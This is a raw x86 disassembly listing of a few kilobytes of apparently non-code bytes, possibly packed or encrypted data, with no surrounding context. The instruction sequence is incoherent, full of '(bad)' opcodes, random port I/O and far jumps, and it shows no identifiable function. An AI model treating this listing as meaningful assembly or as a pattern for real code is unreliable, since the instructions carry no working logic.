  40adf6:	jmp    0x40ae48
  40adf8:	mov    BYTE PTR [esi+0x2be3ae92],ah
  40adfe:	not    DWORD PTR [esi-0x154ae2b]
  40ae04:	fimul  WORD PTR [ebx-0x29]
  40ae07:	mov    ds:0x1b661feb,al
  40ae0c:	mov    bh,0x67
  40ae0e:	xor    DWORD PTR [ebx],ebx
  40ae10:	fst    DWORD PTR [esi-0x60]
  40ae13:	jns    0x40adf1
  40ae15:	jge    0x40adb7
  40ae17:	ret    
  40ae18:	into   
  40ae19:	aad    0x5b
  40ae1b:	dec    esp
  40ae1c:	pop    ecx
  40ae1d:	push   ebp
  40ae1e:	add    DWORD PTR [esi+0x35],ebp
  40ae21:	xor    al,0x81
  40ae23:	iret   
  40ae24:	lea    eax,[edi+ebp*4-0x5d]
  40ae28:	xlat   BYTE PTR ds:[ebx]
  40ae29:	inc    ecx
  40ae2a:	mov    al,0x46
  40ae2c:	cmp    dh,BYTE PTR ds:0x82b3994f
  40ae32:	nop
  40ae33:	jmp    0xcf0c:0x40ae9bf6
  40ae3a:	push   es
  40ae3b:	out    dx,al
  40ae3c:	pop    edi
  40ae3d:	cwde   
  40ae3e:	sbb    esp,DWORD PTR [edi+0x27f0796]
  40ae44:	lahf   
  40ae45:	out    0x11,eax
  40ae47:	out    0x4e,al
  40ae49:	xchg   ebx,eax
  40ae4a:	mov    ah,0x44
  40ae4c:	jbe    0x40ae70
  40ae4e:	xlat   BYTE PTR ds:[ebx]
  40ae4f:	and    dh,BYTE PTR [eax]
  40ae51:	lahf   
  40ae52:	pop    edi
  40ae53:	push   esi
  40ae54:	scas   eax,DWORD PTR es:[edi]
  40ae55:	and    eax,0x4d2fa405
  40ae5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae5b:	out    dx,al
  40ae5c:	jle    0x40adf1
  40ae5e:	retf   0xd235
  40ae61:	cwde   
  40ae62:	nop
  40ae63:	ffree  st(1)
  40ae65:	jp     0x40ae77
  40ae67:	scas   al,BYTE PTR es:[edi]
  40ae68:	std    
  40ae69:	xchg   esp,eax
  40ae6a:	out    dx,al
  40ae6b:	shl    BYTE PTR [edx+0x7075f817],0xfd
  40ae72:	dec    esp
  40ae73:	psubsb mm3,QWORD PTR [ebp+0x3d]
  40ae77:	mov    ds:0xcac45193,al
  40ae7c:	adc    esi,DWORD PTR [ebx+0x35]
  40ae7f:	data16 jl 0x40aecb
  40ae82:	or     DWORD PTR [edi-0x4f8e3534],eax
  40ae88:	in     al,0xac
  40ae8a:	dec    ebx
  40ae8b:	dec    esi
  40ae8c:	adc    DWORD PTR [ebx],eax
  40ae8e:	or     ah,dl
  40ae90:	cmp    dl,BYTE PTR [eax]
  40ae92:	and    DWORD PTR [ecx-0x4d],0xffffffc0
  40ae96:	dec    edx
  40ae97:	icebp  
  40ae98:	fidivr DWORD PTR [ebp+0x5a4b559a]
  40ae9e:	and    BYTE PTR [ebx-0x36],cl
  40aea1:	sar    DWORD PTR [ecx-0xd],1
  40aea4:	lea    ecx,[edi]
  40aea6:	xchg   esi,eax
  40aea7:	scas   eax,DWORD PTR es:[edi]
  40aea8:	cld    
  40aea9:	jle    0x40ae59
  40aeab:	js     0x40ae81
  40aead:	sar    BYTE PTR [ecx-0x64],0x48
  40aeb1:	inc    esp
  40aeb2:	dec    edi
  40aeb3:	xchg   esi,eax
  40aeb4:	cmp    esp,DWORD PTR [edi]
  40aeb6:	add    esp,edi
  40aeb8:	or     eax,0x5fb6083e
  40aebd:	mov    WORD PTR [edx+esi*2+0xe1084a],fs
  40aec4:	ins    BYTE PTR es:[edi],dx
  40aec5:	jo     0x40aefe
  40aec7:	pop    esp
  40aec8:	mov    ds:0xb26dee99,al
  40aecd:	scas   al,BYTE PTR es:[edi]
  40aece:	inc    esp
  40aecf:	imul   esp,DWORD PTR [edi],0x67d990fa
  40aed5:	fs loope 0x40af40
  40aed8:	and    al,0x1d
  40aedb:	pop    edx
  40aedc:	leave  
  40aedd:	pop    edi
  40aede:	mov    ds:0x9353c879,eax
  40aee3:	mov    bh,BYTE PTR [ebx+0x3b1605]
  40aee9:	push   es
  40aeea:	test   BYTE PTR [ecx+0x5e3f9e9],cl
  40aef0:	cmp    DWORD PTR [edi-0x12],0x66
  40aef4:	xchg   edx,eax
  40aef5:	pop    ebx
  40aef6:	fiadd  WORD PTR [ebx-0x28]
  40aef9:	ss jg  0x40af0f
  40aefc:	mov    al,ds:0x90c1eb0d
  40af01:	int3   
  40af02:	mov    cl,0xec
  40af04:	add    al,cl
  40af06:	jne    0x40ae9d
  40af08:	add    edi,ebx
  40af0a:	pop    ds
  40af0b:	dec    esp
  40af0c:	sbb    DWORD PTR ds:[ebp+0x64],esi
  40af10:	sub    DWORD PTR [edi],esi
  40af12:	cs jae 0x40aed2
  40af15:	fadd   st(2),st
  40af17:	in     al,0x18
  40af19:	push   edi
  40af1a:	sub    BYTE PTR [ebx-0x61],bh
  40af1d:	jae    0x40af8b
  40af1f:	call   DWORD PTR [esi]
  40af21:	cli    
  40af22:	inc    ebp
  40af23:	in     al,dx
  40af24:	xchg   ebx,eax
  40af25:	in     al,0xcb
  40af27:	xor    al,0x6f
  40af29:	rcr    DWORD PTR [ebp-0x1532d1c9],0x77
  40af30:	(bad)  
  40af31:	jg     0x40aef5
  40af33:	lock push ss
  40af35:	xchg   DWORD PTR [ecx-0x10de9b91],eax
  40af3b:	je     0x40af5e
  40af3d:	push   edi
  40af3e:	sbb    al,0x4b
  40af40:	cmp    DWORD PTR [ebp-0x40d803a5],0x41
  40af47:	cmp    eax,0xb3878561
  40af4c:	call   0x148e7b3d
  40af51:	mov    ebx,0x56e4f282
  40af56:	(bad)  
  40af57:	pop    ebp
  40af58:	mov    al,0xa0
  40af5a:	jb     0x40af88
  40af5c:	int    0x7a
  40af5e:	inc    ebx
  40af5f:	stc    
  40af60:	sub    dl,BYTE PTR [ecx-0x1ad7bebb]
  40af66:	pop    eax
  40af67:	jbe    0x40af54
  40af69:	lea    ecx,[ebx]
  40af6b:	add    al,0x34
  40af6d:	in     al,0xba
  40af6f:	jp     0x40af85
  40af71:	loope  0x40afa9
  40af73:	mov    eax,0x9034b4ab
  40af78:	mov    dh,0x42
  40af7a:	(bad)  
  40af7b:	dec    ebp
  40af7c:	es scas al,BYTE PTR es:[edi]
  40af7e:	cmc    
  40af7f:	xor    dh,cl
  40af81:	mov    ds:0xfccc039f,eax
  40af86:	loopne 0x40afd4
  40af88:	xchg   ecx,eax
  40af89:	arpl   WORD PTR [esi-0x2b],di
  40af8c:	adc    DWORD PTR [eax+0x6fdecd29],ecx
  40af92:	ret    0xf954
  40af95:	inc    ebp
  40af96:	ins    BYTE PTR es:[edi],dx
  40af97:	sbb    al,0x42
  40af99:	das    
  40af9a:	sub    dh,bl
  40af9c:	inc    ebx
  40af9d:	add    eax,0xc90337c8
  40afa2:	dec    edi
  40afa3:	popa   
  40afa4:	retfw  
  40afa6:	fld    QWORD PTR [edi+ebp*1]
  40afa9:	mov    ds:0xf9b9c6b7,al
  40afae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afaf:	push   edi
  40afb0:	scas   eax,DWORD PTR es:[edi]
  40afb1:	mov    ds:0x6faeeae4,eax
  40afb6:	mov    bl,0x2f
  40afb8:	dec    ebx
  40afb9:	outs   dx,BYTE PTR ds:[esi]
  40afba:	sbb    BYTE PTR [ecx-0x5826483b],0xee
  40afc1:	stc    
  40afc2:	push   ss
  40afc3:	lods   eax,DWORD PTR ds:[esi]
  40afc4:	adc    DWORD PTR [edx-0x1cdde198],0xffffffd3
  40afcb:	adc    ebx,edi
  40afcd:	jb     0x40b045
  40afcf:	repnz inc edi
  40afd1:	cmp    ecx,DWORD PTR [edi-0x5a]
  40afd4:	nop
  40afd5:	mov    edi,0x2b875c2e
  40afda:	leave  
  40afdb:	ja     0x40afd8
  40afdd:	sbb    al,0x5a
  40afdf:	arpl   ax,sp
  40afe1:	nop
  40afe2:	ror    ah,cl
  40afe4:	jle    0x40b02f
  40afe6:	cmp    edi,DWORD PTR [esi-0x36fc8282]
  40afec:	push   0xc7a0f07
  40aff1:	push   edx
  40aff2:	loop   0x40afab
  40aff4:	mov    DWORD PTR [edi-0x413a021c],esp
  40affa:	or     BYTE PTR [ebx+ecx*8],bl
  40affd:	push   edi
  40affe:	sbb    BYTE PTR [eax+0x28],cl
  40b001:	outs   dx,BYTE PTR ds:[esi]
  40b002:	fadd   st,st(1)
  40b004:	cmp    DWORD PTR ds:0x85f01b6b,edi
  40b00a:	sar    DWORD PTR [ebp-0x50],1
  40b00d:	ins    BYTE PTR es:[edi],dx
  40b00e:	dec    esi
  40b00f:	mov    ebx,ebp
  40b011:	sbb    edi,ebp
  40b013:	scas   al,BYTE PTR es:[edi]
  40b014:	jmp    0x40b010
  40b016:	inc    esp
  40b017:	fwait
  40b018:	jecxz  0x40afb0
  40b01a:	xor    al,0xcf
  40b01c:	aam    0x21
  40b01e:	mov    eax,DWORD PTR [ebp-0x3a134384]
  40b024:	fstp   TBYTE PTR ds:0xb54fa7f6
  40b02a:	dec    eax
  40b02b:	xchg   edi,eax
  40b02c:	or     DWORD PTR es:[eax],edi
  40b02f:	sbb    edx,ecx
  40b031:	pop    eax
  40b032:	jb     0x40b00d
  40b034:	ror    BYTE PTR [eax+0x714284a1],cl
  40b03a:	mov    ecx,0x4f9023e3
  40b03f:	mov    eax,0xfb187b4e
  40b044:	and    esi,edx
  40b046:	loop   0x40afde
  40b048:	sub    ecx,ecx
  40b04a:	out    0x1e,al
  40b04c:	mov    eax,ds:0xd3d500ff
  40b051:	jmp    0x40afe2
  40b053:	mov    ebp,0x70f91bff
  40b058:	mov    ah,0x71
  40b05a:	mov    ah,0x4a
  40b05c:	lock sbb BYTE PTR [edi],dl
  40b05f:	mov    dh,0x38
  40b061:	adc    eax,edi
  40b063:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b064:	jo     0x40afef
  40b066:	jp     0x40b088
  40b068:	enter  0xf9de,0x81
  40b06c:	scas   al,BYTE PTR es:[edi]
  40b06d:	mov    edx,0x94c21011
  40b072:	neg    BYTE PTR [edi+0x30]
  40b075:	pop    ebx
  40b076:	push   0xffffffd9
  40b078:	cmc    
  40b079:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b07a:	arpl   WORD PTR [edx+0x73],cx
  40b07d:	fistp  DWORD PTR [eax+0x7b460dda]
  40b083:	sub    DWORD PTR [ebx+edx*8+0x80b1d6a],ebp
  40b08a:	(bad)  
  40b08b:	inc    edi
  40b08c:	dec    ecx
  40b08d:	mov    cl,0x9d
  40b08f:	push   0xffffffd5
  40b091:	xchg   ebx,eax
  40b092:	mov    bl,0x41
  40b094:	(bad)  
  40b095:	cmpxchg ch,bl
  40b098:	and    al,0xb7
  40b09a:	xor    eax,0x4c7bf28f
  40b09f:	(bad)  
  40b0a0:	jmp    0x40b087
  40b0a2:	cmp    al,0x90
  40b0a4:	push   edx
  40b0a5:	cmp    DWORD PTR [esi],edx
  40b0a7:	lea    ebx,[ecx+0x7b]
  40b0aa:	xor    DWORD PTR [ebp-0x55],edi
  40b0ad:	mov    edi,DWORD PTR [ecx+0x5]
  40b0b0:	sub    bl,BYTE PTR ds:0x1751
  40b0b5:	addr16 xchg ebp,eax
  40b0b7:	jae    0x40b061
  40b0b9:	dec    edx
  40b0ba:	mov    esp,0xf7eb10f1
  40b0bf:	out    dx,al
  40b0c0:	push   0xcc5aea3a
  40b0c5:	mov    edi,0x3f6c6bbe
  40b0ca:	xlat   BYTE PTR ds:[ebx]
  40b0cb:	jge    0x40b136
  40b0cd:	jne    0x40b08e
  40b0cf:	pop    ds
  40b0d0:	inc    esi
  40b0d1:	mov    ah,0x4b
  40b0d3:	mov    edi,0x6ecbba63
  40b0d8:	inc    esp
  40b0d9:	pop    esp
  40b0da:	adc    esi,DWORD PTR [ebx-0x79]
  40b0dd:	push   es
  40b0de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0e0:	xchg   edi,eax
  40b0e1:	sbb    esi,edx
  40b0e3:	cmp    BYTE PTR [edx+eiz*8],cl
  40b0e6:	popf   
  40b0e7:	inc    ecx
  40b0e8:	pop    edi
  40b0e9:	xchg   esi,eax
  40b0ea:	das    
  40b0eb:	sub    DWORD PTR [esi+edx*2+0x43],eax
  40b0ef:	stos   DWORD PTR es:[edi],eax
  40b0f0:	aam    0x95
  40b0f2:	pop    edx
  40b0f3:	into   
  40b0f4:	js     0x40b0c3
  40b0f6:	aaa    
  40b0f7:	nop
  40b0f8:	pop    esi
  40b0f9:	imul   BYTE PTR [ebx]
  40b0fb:	push   edx
  40b0fc:	push   ebx
  40b0fd:	jb     0x40b161
  40b0ff:	or     dl,BYTE PTR [ebp+0x70ecfcbd]
  40b105:	sbb    esp,DWORD PTR [ebp+0x45]
  40b108:	es push 0xffffffcf
  40b10b:	jmp    0x40b0aa
  40b10d:	sti    
  40b10e:	scas   eax,DWORD PTR es:[edi]
  40b10f:	icebp  
  40b110:	and    BYTE PTR [ecx+0x32],cl
  40b113:	cmp    DWORD PTR [ebx-0x4],ebp
  40b116:	mul    ebx
  40b118:	lock pop ds
  40b11a:	cmp    BYTE PTR [ecx+0x2e],ch
  40b11d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b11e:	(bad)  
  40b11f:	sbb    eax,0xfa24918b
  40b124:	or     BYTE PTR [edx],dh
  40b126:	or     DWORD PTR [eax],eax
  40b128:	retf   0x258
  40b12b:	fist   WORD PTR [esi-0xd]
  40b12e:	out    0x98,eax
  40b130:	pop    esp
  40b131:	mov    ds:0x7a0d5775,al
  40b136:	and    esi,edi
  40b138:	xchg   edx,eax
  40b139:	jne    0x40b199
  40b13b:	and    BYTE PTR [di-0x2775],dh
  40b140:	mov    edi,0xc9f0bfed
  40b145:	adc    bl,BYTE PTR [ebx+0x49fca8aa]
  40b14b:	add    al,0x3
  40b14d:	dec    esp
  40b14e:	push   ebp
  40b14f:	adc    esp,edi
  40b151:	adc    dh,dl
  40b153:	shl    BYTE PTR [esp+ebp*4+0x31],cl
  40b157:	xor    eax,DWORD PTR [ecx]
  40b159:	and    BYTE PTR [ebx+eiz*2],0x6e
  40b15d:	ins    DWORD PTR es:[edi],dx
  40b15e:	gs je  0x40b114
  40b161:	xor    DWORD PTR [eax+eax*8+0x318db00a],ebx
  40b168:	stos   DWORD PTR es:[edi],eax
  40b169:	test   eax,0x16b8547
  40b16e:	(bad)  
  40b16f:	push   ecx
  40b170:	xchg   ebp,eax
  40b171:	mov    ecx,0xde20ef11
  40b176:	xchg   ebp,eax
  40b177:	ds gs int3 
  40b17a:	shl    eax,0x62
  40b17d:	mov    ds:0xe4a33e43,eax
  40b182:	xor    eax,0xece810de
  40b187:	call   0xc2f19c7
  40b18c:	pop    esi
  40b18d:	daa    
  40b18e:	aam    0x41
  40b190:	cdq    
  40b191:	push   edi
  40b192:	ja     0x40b180
  40b194:	mov    edx,0xa1751a4e
  40b199:	and    BYTE PTR [ebp+0x32],al
  40b19c:	dec    ebx
  40b19d:	cmp    ah,BYTE PTR [ebx+0x2551ec12]
  40b1a3:	cld    
  40b1a4:	fs xor eax,0x150e2023
  40b1aa:	out    dx,eax
  40b1ab:	xchg   esp,eax
  40b1ac:	sahf   
  40b1ad:	call   0x3ecccda4
  40b1b2:	pop    ss
  40b1b3:	mov    ebp,DWORD PTR [esi+0x4c]
  40b1b6:	xchg   ecx,eax
  40b1b7:	ins    DWORD PTR es:[edi],dx
  40b1b8:	int3   
  40b1b9:	test   BYTE PTR [eax],dh
  40b1bb:	mov    eax,ds:0xd3a2b91c
  40b1c0:	push   edi
  40b1c1:	lods   al,BYTE PTR ds:[esi]
  40b1c2:	(bad)  
  40b1c4:	jb     0x40b188
  40b1c6:	cmp    DWORD PTR [ebp-0x2b],edi
  40b1c9:	xchg   edx,eax
  40b1ca:	add    al,0x33
  40b1cc:	fmul   DWORD PTR [edx+0x6a]
  40b1cf:	retf   0x1bbb
  40b1d2:	or     BYTE PTR [edx+ecx*1+0x5a],bh
  40b1d6:	add    eax,0x11df6456
  40b1db:	(bad)  
  40b1dc:	in     al,dx
  40b1dd:	dec    esp
  40b1de:	sub    edi,DWORD PTR [eax+0x6a7a7b55]
  40b1e4:	adc    BYTE PTR [edi+0x7bdde274],dl
  40b1ea:	dec    edx
  40b1eb:	sub    DWORD PTR [eax-0x36734228],ebx
  40b1f1:	icebp  
  40b1f2:	sub    al,0x19
  40b1f4:	push   0x30
  40b1f6:	cmp    al,0x34
  40b1f8:	inc    ebx
  40b1f9:	pop    eax
  40b1fa:	(bad)  [edi+0x14455b77]
  40b200:	xor    ecx,0x4e
  40b203:	xchg   edi,eax
  40b204:	das    
  40b205:	fsub   st,st(1)
  40b207:	ds in  eax,dx
  40b209:	xchg   ebx,eax
  40b20a:	je     0x40b1d1
  40b20c:	mov    esp,0xa77c8016
  40b211:	imul   edi,DWORD PTR [ebp+0xee268b4],0x78
  40b218:	cmp    al,0x9
  40b21a:	cmp    ebp,esi
  40b21c:	adc    DWORD PTR [ebx],edi
  40b21e:	rdmsr  
  40b220:	pop    esi
  40b221:	sbb    eax,0x4bdebe41
  40b226:	in     al,0x3b
  40b228:	sbb    eax,0x2f563539
  40b22d:	int3   
  40b22e:	scas   eax,DWORD PTR es:[edi]
  40b22f:	and    al,0x94
  40b231:	in     al,dx
  40b232:	add    BYTE PTR [edx-0x4562caca],0x32
  40b239:	cdq    
  40b23a:	cmp    ah,BYTE PTR [ebp+0x1a799fed]
  40b240:	jns    0x40b241
  40b242:	adc    BYTE PTR [eax+eiz*1-0x55ca253e],cl
  40b249:	cld    
  40b24a:	sbb    al,0xdf
  40b24c:	lods   al,BYTE PTR ds:[esi]
  40b24d:	dec    ecx
  40b24e:	into   
  40b24f:	mov    cl,0xa7
  40b251:	div    BYTE PTR [ebx-0x45]
  40b254:	aam    0x51
  40b256:	jmp    0x40b24f
  40b258:	sbb    al,BYTE PTR [ecx-0x2695d3ee]
  40b25e:	mov    bh,0xb4
  40b260:	stos   BYTE PTR es:[edi],al
  40b261:	adc    eax,0xee724c9e
  40b266:	or     cl,BYTE PTR [edx-0x34]
  40b269:	mov    WORD PTR [ebx],fs
  40b26b:	xchg   BYTE PTR [esi-0xdd15dd0],ch
  40b271:	mov    es,WORD PTR [edi+0x7c6ddde0]
  40b277:	hlt    
  40b278:	loope  0x40b2dd
  40b27a:	leave  
  40b27b:	jmp    0xb5e5:0xfd8b02e
  40b282:	inc    ecx
  40b283:	pusha  
  40b284:	fidiv  DWORD PTR [ebx+0x2614d168]
  40b28a:	sub    eax,ebx
  40b28c:	xlat   BYTE PTR ds:[ebx]
  40b28d:	jbe    0x40b21b
  40b28f:	pop    ebp
  40b290:	pop    esi
  40b291:	scas   al,BYTE PTR es:[edi]
  40b292:	int3   
  40b293:	push   DWORD PTR [edi-0x47]
  40b296:	xchg   BYTE PTR [edx-0x13],ch
  40b299:	pop    ebp
  40b29a:	add    al,0xae
  40b29c:	(bad)  
  40b29d:	fst    QWORD PTR [ecx-0x1503a804]
  40b2a3:	push   edi
  40b2a4:	add    al,0xdb
  40b2a6:	lock jecxz 0x40b2f8
  40b2a9:	lea    ebx,[edx-0xab27f55]
  40b2af:	sub    BYTE PTR [edi],dl
  40b2b1:	and    eax,0x5021ac00
  40b2b6:	dec    esi
  40b2b7:	arpl   WORD PTR [esp+eiz*8+0x77415733],dx
  40b2be:	add    al,0x53
  40b2c0:	cwde   
  40b2c1:	xor    BYTE PTR [esp+edx*4+0x32],cl
  40b2c5:	mov    BYTE PTR [edi-0x3376124e],dh
  40b2cb:	int3   
  40b2cc:	or     al,0x36
  40b2ce:	lods   eax,DWORD PTR ds:[esi]
  40b2cf:	aaa    
  40b2d0:	scas   eax,DWORD PTR es:[edi]
  40b2d1:	scas   eax,DWORD PTR es:[edi]
  40b2d2:	test   DWORD PTR [ecx+ebp*1-0x300f2d2b],0x2601745c
  40b2dd:	call   0xe2ed:0x3498419c
  40b2e4:	shl    DWORD PTR ds:0xd66a6249,0x25
  40b2eb:	in     eax,0xa8
  40b2ed:	daa    
  40b2ee:	in     eax,dx
  40b2ef:	sbb    esi,esp
  40b2f1:	or     al,0x5
  40b2f3:	mov    edi,esp
  40b2f5:	gs cmp al,0x4f
  40b2f8:	jmp    0x1631:0x974e7fed
  40b2ff:	mov    WORD PTR [esp+ecx*1+0xb350c4e],?
  40b306:	popf   
  40b307:	data16 inc BYTE PTR [eax+esi*2]
  40b30b:	lahf   
  40b30c:	mov    eax,ds:0x31c041e2
  40b311:	sbb    al,0xd0
  40b313:	pop    ecx
  40b314:	rep stos DWORD PTR es:[edi],eax
  40b316:	mov    bh,0x94
  40b318:	icebp  
  40b319:	sub    al,0xda
  40b31b:	sahf   
  40b31c:	cdq    
  40b31d:	or     ebx,DWORD PTR [eax-0x37a341d0]
  40b323:	push   0xffffff80
  40b325:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b326:	dec    ebp
  40b327:	or     al,BYTE PTR [ebp+edx*8+0x272669c1]
  40b32e:	and    BYTE PTR [ecx],0x7
  40b331:	fisub  WORD PTR ds:0x5e073c94
  40b337:	test   BYTE PTR ds:0xa4eebde,dh
  40b33d:	fwait
  40b33e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b33f:	out    dx,eax
  40b340:	xor    DWORD PTR [ebx],esp
  40b342:	imul   ecx,DWORD PTR [edi-0x36e42f9f],0x6f
  40b349:	sub    eax,0x8947aa3c
  40b34e:	push   edx
  40b34f:	loop   0x40b36c
  40b351:	and    BYTE PTR [ebx+ebx*8],cl
  40b354:	sub    DWORD PTR [ebp+edi*1-0x37c7c9a5],esp
  40b35b:	in     eax,dx
  40b35c:	je     0x40b31b
  40b35e:	cmp    al,0xb
  40b360:	aam    0x79
  40b362:	hlt    
  40b363:	mov    ebx,0x53588e69
  40b368:	inc    ebp
  40b369:	dec    esp
  40b36a:	jp     0x40b308
  40b36c:	cmp    BYTE PTR [ebx-0x45304eb0],bh
  40b372:	hlt    
  40b373:	lock lea esi,[esi-0x31b0e590]
  40b37a:	adc    esp,DWORD PTR [ebx]
  40b37c:	and    BYTE PTR [edi-0x28def9eb],cl
  40b382:	addr16 jmp 0x48038c6c
  40b388:	sub    al,0x36
  40b38a:	xchg   esp,eax
  40b38b:	das    
  40b38c:	pop    ss
  40b38d:	dec    ecx
  40b38e:	inc    edx
  40b38f:	shr    ch,cl
  40b391:	mov    dl,0x1
  40b393:	jecxz  0x40b316
  40b395:	pusha  
  40b396:	xor    eax,0x567adf58
  40b39b:	loop   0x40b37e
  40b39d:	xchg   ecx,eax
  40b39e:	cmp    DWORD PTR [eax-0x636e07b7],edi
  40b3a4:	xchg   esi,eax
  40b3a5:	adc    dl,bl
  40b3a7:	inc    ecx
  40b3a8:	retf   0x2410
  40b3ab:	inc    ebx
  40b3ac:	pop    ds
  40b3ad:	cmp    BYTE PTR [edx-0x4ee9ddda],dh
  40b3b3:	mov    ds:0x439eecc6,al
  40b3b8:	lahf   
  40b3b9:	mov    WORD PTR [edx-0x72],cs
  40b3bc:	inc    ecx
  40b3bd:	in     al,0x2
  40b3bf:	fdiv   DWORD PTR [ebp-0x4a]
  40b3c2:	pop    ss
  40b3c3:	loopne 0x40b384
  40b3c5:	es dec ebx
  40b3c7:	inc    eax
  40b3c8:	sbb    BYTE PTR [ebp+0x41e54265],bh
  40b3ce:	mov    fs,edi
  40b3d0:	sbb    dh,BYTE PTR [ecx-0x7b]
  40b3d3:	and    ch,BYTE PTR [ecx]
  40b3d5:	ja     0x40b429
  40b3d7:	lods   eax,DWORD PTR ds:[esi]
  40b3d8:	popa   
  40b3d9:	pop    esi
  40b3da:	dec    edx
  40b3db:	push   esp
  40b3dc:	or     DWORD PTR [edi],esi
  40b3de:	sbb    BYTE PTR [esp+ebp*1],0x76
  40b3e2:	push   ecx
  40b3e3:	inc    ecx
  40b3e4:	adc    BYTE PTR [esp+ebp*1+0x69975be6],dl
  40b3eb:	and    DWORD PTR [ecx],0x2c202a78
  40b3f1:	pop    ss
  40b3f2:	cmc    
  40b3f3:	push   ds
  40b3f4:	jns    0x40b40c
  40b3f6:	test   DWORD PTR [edx],ebp
  40b3f8:	test   BYTE PTR [ecx+0x1b],al
  40b3fb:	push   esp
  40b3fc:	dec    ebp
  40b3fd:	aam    0xf6
  40b3ff:	and    al,0xe5
  40b401:	and    BYTE PTR [edx+0x61aa286e],0x43
  40b408:	out    0x6b,al
  40b40a:	push   ebx
  40b40b:	ins    BYTE PTR es:[edi],dx
  40b40c:	lock xchg ebx,eax
  40b40e:	sub    BYTE PTR [ecx-0x29],dh
  40b411:	imul   ebx,edi,0xb888ac64
  40b417:	inc    ebx
  40b418:	jl     0x40b39e
  40b41a:	pop    edx
  40b41b:	aam    0x32
  40b41d:	and    al,BYTE PTR [ecx+0x65cbf47c]
  40b423:	lods   eax,DWORD PTR ds:[esi]
  40b424:	xor    al,0x13
  40b426:	mov    eax,0x7d86a796
  40b42b:	std    
  40b42c:	out    0xbe,eax
  40b42e:	outs   dx,BYTE PTR ds:[esi]
  40b42f:	mov    edi,0x6487257b
  40b434:	je     0x40b453
  40b436:	daa    
  40b437:	and    DWORD PTR [eax-0x37],edx
  40b43a:	inc    eax
  40b43b:	sub    DWORD PTR [edi+0x14],esp
  40b43e:	sbb    bh,BYTE PTR [ebx-0x3]
  40b441:	mov    dh,0xf3
  40b443:	sbb    al,0xce
  40b445:	xor    al,0xcd
  40b447:	loop   0x40b48e
  40b449:	mov    al,ds:0x48dcb2be
  40b44e:	test   eax,0x1386bc3a
  40b453:	mov    ch,0xa0
  40b455:	in     eax,dx
  40b456:	aas    
  40b457:	jmp    0xf78acfef
  40b45c:	xor    eax,0xc8341e5a
  40b461:	mov    ebx,esp
  40b463:	dec    ebx
  40b464:	or     al,0xd7
  40b466:	shr    ah,0x2
  40b469:	add    BYTE PTR [eax+eax*8+0x3b],ch
  40b46d:	int3   
  40b46e:	daa    
  40b46f:	push   eax
  40b470:	mov    esi,0xdb811ee2
  40b475:	inc    ecx
  40b476:	aas    
  40b477:	inc    esp
  40b478:	jl     0x40b4db
  40b47a:	call   0x29412fcd
  40b47f:	inc    edx
  40b480:	(bad)  
  40b481:	inc    esi
  40b482:	inc    edx
  40b483:	ror    BYTE PTR [ecx],cl
  40b485:	test   DWORD PTR [ecx+0xd],0x2f8d2608
  40b48c:	xor    eax,0xb86edeeb
  40b491:	add    esp,0x10
  40b494:	xor    dl,dh
  40b496:	jns    0x40b4d4
  40b498:	xchg   esi,eax
  40b499:	adc    ch,BYTE PTR ds:0x686fda68
  40b49f:	inc    esi
  40b4a0:	mov    eax,DWORD PTR [esi]
  40b4a2:	mov    edi,0x6d72df2e
  40b4a7:	cmp    dl,BYTE PTR [ecx-0x59]
  40b4aa:	into   
  40b4ab:	mov    ebp,0xb5766e32
  40b4b0:	popf   
  40b4b1:	push   esi
  40b4b2:	scas   al,BYTE PTR es:[edi]
  40b4b3:	int3   
  40b4b4:	sub    ah,BYTE PTR [eax]
  40b4b6:	cmp    al,BYTE PTR [eax-0x6adee05a]
  40b4bc:	sti    
  40b4bd:	jbe    0x40b497
  40b4bf:	adc    DWORD PTR [esi+0xd],edi
  40b4c2:	scas   al,BYTE PTR es:[edi]
  40b4c3:	test   DWORD PTR [eax-0x5a],ebp
  40b4c6:	retf   
  40b4c7:	(bad)  
  40b4c8:	jns    0x40b52e
  40b4ca:	icebp  
  40b4cb:	mov    esi,0xb2f010d4
  40b4d0:	pop    edi
  40b4d1:	out    0xa0,al
  40b4d3:	jecxz  0x40b4ed
  40b4d5:	pop    ebp
  40b4d6:	inc    ecx
  40b4d7:	ret    
  40b4d8:	inc    edx
  40b4d9:	je     0x40b499
  40b4db:	mov    WORD PTR [eax-0xe],fs
  40b4de:	dec    ebx
  40b4df:	leave  
  40b4e0:	or     dl,BYTE PTR [ebx]
  40b4e2:	(bad)  
  40b4e3:	jmp    0x2876:0xe071456c
  40b4ea:	xchg   BYTE PTR [edx-0x1599f0dc],dh
  40b4f0:	rcr    DWORD PTR [ebx-0x3c],cl
  40b4f3:	cwde   
  40b4f4:	jecxz  0x40b517
  40b4f6:	push   ss
  40b4f7:	push   ebp
  40b4f8:	or     BYTE PTR [ebx],dh
  40b4fa:	ins    DWORD PTR es:[edi],dx
  40b4fb:	test   BYTE PTR [ebp+0x5c471664],cl
  40b501:	repz in al,0x9c
  40b504:	and    edx,DWORD PTR [ebp+ebp*2-0x28d65138]
  40b50b:	shl    BYTE PTR [ebp+0xef98dea],1
  40b511:	out    0x79,al
  40b513:	dec    edx
  40b514:	das    
  40b515:	fisttp WORD PTR [ecx-0x393f4208]
  40b51b:	rcr    BYTE PTR [ecx+ebx*2-0x9],1
  40b51f:	addr16 call 0xe2cf:0xf10da820
  40b527:	mov    ds:0xc7227114,al
  40b52c:	inc    esp
  40b52d:	ficom  DWORD PTR [edx+eax*2+0x4e25b02a]
  40b534:	shr    DWORD PTR [edi+0x2647b0bb],1
  40b53a:	mov    edi,0xebfaa95b
  40b53f:	jo     0x40b553
  40b541:	jo     0x40b526
  40b543:	addr16 or bh,ah
  40b546:	leave  
  40b547:	adc    BYTE PTR [esi-0x10f06039],bh
  40b54d:	xor    eax,0x2d3d8060
  40b552:	(bad)  
  40b553:	fdivr  DWORD PTR [ecx+0x6e6045d0]
  40b559:	fdivr  DWORD PTR [ecx-0x6]
  40b55c:	cs inc ebx
  40b55e:	ja     0x40b59c
  40b560:	dec    ebx
  40b561:	pop    ss
